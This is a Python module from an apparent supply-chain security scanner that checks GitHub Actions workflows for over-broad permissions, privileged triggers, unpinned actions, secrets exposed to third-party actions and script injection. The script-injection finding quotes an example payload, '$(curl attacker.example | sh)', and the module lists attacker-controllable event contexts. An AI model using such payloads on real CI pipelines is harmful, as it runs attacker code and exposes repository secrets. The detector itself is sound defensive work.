"""Static analysis of GitHub Actions workflow definitions.

A workflow file is the most privileged code in a repository: it runs on every
push, holds the repository's secrets, and — unlike application code — often
executes third-party code pinned to a mutable tag. The checks here are the ones
with a clear, defensible rule behind them rather than a guess.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any

import yaml

from supplyguard.core.types import Severity
from supplyguard.detectors.script_analysis import analyse_script

#: A full 40-character commit SHA. Anything shorter is a mutable reference.
_SHA_RE = re.compile(r"^[0-9a-f]{40}$")
#: Actions published by GitHub itself; still worth pinning, but far lower risk.
_TRUSTED_OWNERS = {"actions", "github", "docker", "dependabot"}
#: Contexts that interpolate attacker-controllable text into a shell command.
_UNTRUSTED_CONTEXTS = (
    "github.event.issue.title", "github.event.issue.body",
    "github.event.pull_request.title", "github.event.pull_request.body",
    "github.event.comment.body", "github.event.review.body",
    "github.event.head_commit.message", "github.event.pull_request.head.ref",
    "github.head_ref",
)
#: Triggers that run with a writable token and repository secrets on code the
#: submitter controls.
_DANGEROUS_TRIGGERS = {"pull_request_target", "workflow_run"}


@dataclass(slots=True)
class WorkflowIssue:
    rule: str
    severity: Severity
    title: str
    description: str
    remediation: str
    workflow_path: str
    job: str | None = None
    step: str | None = None
    evidence: list[dict[str, Any]] = field(default_factory=list)
    details: dict[str, Any] = field(default_factory=dict)

    @property
    def external_id(self) -> str:
        """Stable identity so repeated polling does not duplicate the timeline."""
        return f"workflow:{self.workflow_path}:{self.rule}:{self.job or '-'}:{self.step or '-'}"


def analyse_workflow(path: str, content: str) -> list[WorkflowIssue]:
    """Analyse one workflow definition."""
    try:
        document = yaml.safe_load(content)
    except yaml.YAMLError as exc:
        return [
            WorkflowIssue(
                rule="unparseable",
                severity=Severity.INFO,
                title=f"{path} could not be parsed",
                description=f"The workflow is not valid YAML: {exc}",
                remediation="Fix the YAML syntax so the workflow can be analysed.",
                workflow_path=path,
            )
        ]
    if not isinstance(document, dict):
        return []

    issues: list[WorkflowIssue] = []
    triggers = _triggers(document)
    issues.extend(_check_permissions(path, document, triggers))
    issues.extend(_check_dangerous_triggers(path, document, triggers))

    for job_name, job in (document.get("jobs") or {}).items():
        if not isinstance(job, dict):
            continue
        issues.extend(_check_job_permissions(path, job_name, job))
        for index, step in enumerate(job.get("steps") or []):
            if isinstance(step, dict):
                issues.extend(_check_step(path, job_name, index, step, triggers))
    return issues


def _triggers(document: dict) -> set[str]:
    # PyYAML parses the bare key `on:` as the boolean True.
    raw = document.get("on", document.get(True))
    if isinstance(raw, str):
        return {raw}
    if isinstance(raw, list):
        return {str(t) for t in raw}
    if isinstance(raw, dict):
        return {str(t) for t in raw}
    return set()


def _check_permissions(path: str, document: dict, triggers: set[str]) -> list[WorkflowIssue]:
    permissions = document.get("permissions")
    if permissions == "write-all" or (
        isinstance(permissions, dict) and permissions.get("contents") == "write"
        and len(permissions) > 4
    ):
        return [
            WorkflowIssue(
                rule="permissions_write_all",
                severity=Severity.HIGH,
                title=f"{path} grants broad write permissions to every job",
                description=(
                    "The workflow grants write access to the repository for all "
                    "jobs. Any compromised dependency, action or build script in "
                    "this workflow can then push commits, publish releases or "
                    "alter branch protection using the automatic GITHUB_TOKEN."
                ),
                remediation=(
                    "Set `permissions: {contents: read}` at the workflow level and "
                    "grant narrower write scopes only to the specific jobs that "
                    "need them."
                ),
                workflow_path=path,
                evidence=[
                    {"label": "Declared permissions", "detail": str(permissions), "weight": 0.8}
                ],
                details={"permissions": permissions},
            )
        ]
    if permissions is None:
        return [
            WorkflowIssue(
                rule="permissions_unset",
                severity=Severity.LOW,
                title=f"{path} does not declare permissions",
                description=(
                    "With no `permissions` block the workflow inherits the "
                    "repository default, which in many organisations is still "
                    "read/write for the whole token."
                ),
                remediation="Add an explicit `permissions: {contents: read}` block.",
                workflow_path=path,
                evidence=[
                    {"label": "Triggers", "detail": ", ".join(sorted(triggers)) or "unknown"}
                ],
            )
        ]
    return []


def _check_dangerous_triggers(
    path: str, document: dict, triggers: set[str]
) -> list[WorkflowIssue]:
    risky = triggers & _DANGEROUS_TRIGGERS
    if not risky:
        return []
    return [
        WorkflowIssue(
            rule="privileged_trigger",
            severity=Severity.MEDIUM,
            title=f"{path} runs on {', '.join(sorted(risky))}",
            description=(
                f"`{', '.join(sorted(risky))}` runs with the base repository's "
                "secrets and a writable token, but is triggered by code from a "
                "fork the submitter controls. Checking out and executing the "
                "pull request's head in such a workflow hands repository secrets "
                "to anyone who can open a pull request."
            ),
            remediation=(
                "Do not check out or execute untrusted refs in this workflow. Use "
                "`pull_request` for anything that builds submitted code, and keep "
                "the privileged workflow limited to steps that do not run it."
            ),
            workflow_path=path,
            evidence=[{"label": "Triggers", "detail": ", ".join(sorted(triggers)), "weight": 0.5}],
            details={"triggers": sorted(triggers)},
        )
    ]


def _check_job_permissions(path: str, job_name: str, job: dict) -> list[WorkflowIssue]:
    if job.get("permissions") == "write-all":
        return [
            WorkflowIssue(
                rule="job_permissions_write_all",
                severity=Severity.HIGH,
                title=f"Job '{job_name}' in {path} requests write-all permissions",
                description=(
                    "This job's token can write to every repository scope, "
                    "including packages and actions."
                ),
                remediation="Replace `write-all` with the specific scopes the job needs.",
                workflow_path=path,
                job=job_name,
                evidence=[{"label": "Job permissions", "detail": "write-all", "weight": 0.8}],
            )
        ]
    return []


def _check_step(
    path: str, job_name: str, index: int, step: dict, triggers: set[str]
) -> list[WorkflowIssue]:
    issues: list[WorkflowIssue] = []
    step_name = step.get("name") or f"step {index + 1}"

    uses = step.get("uses")
    if isinstance(uses, str):
        issues.extend(_check_action_pin(path, job_name, step_name, uses))

    issues.extend(_check_secret_exposure(path, job_name, step_name, step))

    run = step.get("run")
    if isinstance(run, str):
        issues.extend(_check_run_script(path, job_name, step_name, run))
        issues.extend(_check_script_injection(path, job_name, step_name, run, triggers))
    return issues


_SECRET_RE = re.compile(r"\$\{\{\s*secrets\.([A-Za-z0-9_]+)\s*\}\}")


def _check_secret_exposure(
    path: str, job_name: str, step_name: str, step: dict
) -> list[WorkflowIssue]:
    """Secrets handed to an unpinned third-party action.

    Passing a repository secret into an action pinned to a mutable tag means
    the secret is available to whatever code that tag points at on the day the
    workflow runs — which is not necessarily the code that was reviewed.
    """
    uses = step.get("uses")
    if not isinstance(uses, str) or uses.startswith(("./", "docker://")):
        return []
    reference, _, version = uses.partition("@")
    owner = reference.split("/", 1)[0].lower()
    if owner in _TRUSTED_OWNERS or (version and _SHA_RE.match(version)):
        return []

    inputs = step.get("with") or {}
    env = step.get("env") or {}
    secrets: set[str] = set()
    for mapping in (inputs, env):
        if isinstance(mapping, dict):
            for value in mapping.values():
                secrets.update(_SECRET_RE.findall(str(value)))
    if not secrets:
        return []

    return [
        WorkflowIssue(
            rule="secret_to_unpinned_action",
            severity=Severity.HIGH,
            title=f"Secrets are passed to unpinned third-party action '{reference}'",
            description=(
                f"Step '{step_name}' passes "
                + ", ".join(sorted(f"`{s}`" for s in secrets))
                + f" to `{uses}`, which resolves through a mutable reference. "
                "Whoever controls that repository can change what runs, and the "
                "secret is handed to whatever code the reference points at on "
                "the day the workflow runs."
            ),
            remediation=(
                f"Pin `{reference}` to a full commit SHA, and scope the secret to "
                "the narrowest token that works. Rotate these secrets if the "
                "action's publisher is not one you actively trust."
            ),
            workflow_path=path,
            job=job_name,
            step=step_name,
            evidence=[
                {"label": "Secrets exposed", "detail": ", ".join(sorted(secrets)), "weight": 0.8},
                {"label": "Action reference", "detail": uses, "weight": 0.6},
            ],
            details={"action": reference, "ref": version, "secrets": sorted(secrets)},
        )
    ]


def _check_action_pin(
    path: str, job_name: str, step_name: str, uses: str
) -> list[WorkflowIssue]:
    """A third-party action must be pinned to a commit SHA.

    A tag is a mutable pointer: whoever controls the action's repository can
    move `v3` to any commit at any time, and every workflow using it executes
    the new code on the next run without any change on your side. This is how
    the `tj-actions/changed-files` compromise reached tens of thousands of
    repositories in March 2025.
    """
    if uses.startswith(("./", "docker://")):
        return []
    reference, _, version = uses.partition("@")
    owner = reference.split("/", 1)[0].lower()
    if not version:
        return []
    if _SHA_RE.match(version):
        return []

    trusted = owner in _TRUSTED_OWNERS
    return [
        WorkflowIssue(
            rule="action_not_pinned",
            severity=Severity.LOW if trusted else Severity.MEDIUM,
            title=f"Action '{reference}' is pinned to the mutable ref '{version}'",
            description=(
                f"`{uses}` resolves through a tag or branch rather than a commit "
                "SHA. Whoever controls that repository can repoint the reference "
                "at different code, which then executes in your workflow with "
                "your secrets on the next run."
                + (
                    " This action is published by a GitHub-owned organisation, "
                    "which lowers but does not remove the risk."
                    if trusted
                    else ""
                )
            ),
            remediation=(
                f"Pin to a full commit SHA: `uses: {reference}@<40-character-sha>`, "
                "with the tag kept alongside as a comment. Dependabot updates "
                "SHA pins automatically."
            ),
            workflow_path=path,
            job=job_name,
            step=step_name,
            evidence=[
                {"label": "Reference", "detail": uses, "weight": 0.6},
                {
                    "label": "Publisher",
                    "detail": f"{owner} ({'GitHub-owned' if trusted else 'third party'})",
                    "weight": 0.2 if trusted else 0.5,
                },
            ],
            details={"action": reference, "ref": version, "trusted_owner": trusted},
        )
    ]


def _check_run_script(
    path: str, job_name: str, step_name: str, run: str
) -> list[WorkflowIssue]:
    """Reuse the install-script analyser on build steps."""
    analysis = analyse_script(run)
    if analysis.score < 0.5:
        return []
    return [
        WorkflowIssue(
            rule="suspicious_build_step",
            severity=Severity.HIGH if analysis.score >= 0.8 else Severity.MEDIUM,
            title=f"Build step '{step_name}' performs suspicious operations",
            description=(
                "A run step in this workflow matched patterns associated with "
                "credential theft or remote code execution: "
                + "; ".join(d.description for d in analysis.detections[:4])
                + "."
            ),
            remediation=(
                "Review this step. Fetching and executing remote scripts during a "
                "build defeats every dependency pin in the repository — vendor the "
                "script and pin it by checksum instead."
            ),
            workflow_path=path,
            job=job_name,
            step=step_name,
            evidence=[
                {
                    "label": detection.behaviour.value.replace("_", " ").title(),
                    "detail": f"{detection.description}. `{detection.excerpt}`",
                    "weight": detection.weight,
                }
                for detection in analysis.detections
            ],
            details={"score": analysis.score},
        )
    ]


def _check_script_injection(
    path: str, job_name: str, step_name: str, run: str, triggers: set[str]
) -> list[WorkflowIssue]:
    """Attacker-controlled text interpolated directly into a shell command.

    `${{ github.event.issue.title }}` inside `run:` is substituted before the
    shell sees it, so a title containing a command substitution executes on the
    runner. GitHub's own hardening guidance calls this out specifically.
    """
    found = [context for context in _UNTRUSTED_CONTEXTS if context in run]
    if not found:
        return []
    return [
        WorkflowIssue(
            rule="script_injection",
            severity=Severity.HIGH,
            title=f"Step '{step_name}' interpolates untrusted input into a shell command",
            description=(
                "This step substitutes "
                + ", ".join(f"`{context}`" for context in found[:3])
                + " directly into a `run:` block. Those values are supplied by "
                "whoever opened the issue or pull request, and expression "
                "substitution happens before the shell runs, so text such as "
                "`$(curl attacker.example | sh)` executes on the runner."
            ),
            remediation=(
                "Pass the value through an environment variable and quote it: "
                "set `env: {TITLE: ${{ github.event.issue.title }}}` and use "
                '`"$TITLE"` in the script, so the shell never parses it as code.'
            ),
            workflow_path=path,
            job=job_name,
            step=step_name,
            evidence=[
                {"label": "Untrusted context", "detail": context, "weight": 0.8}
                for context in found
            ],
            details={"contexts": found, "triggers": sorted(triggers)},
        )
    ]
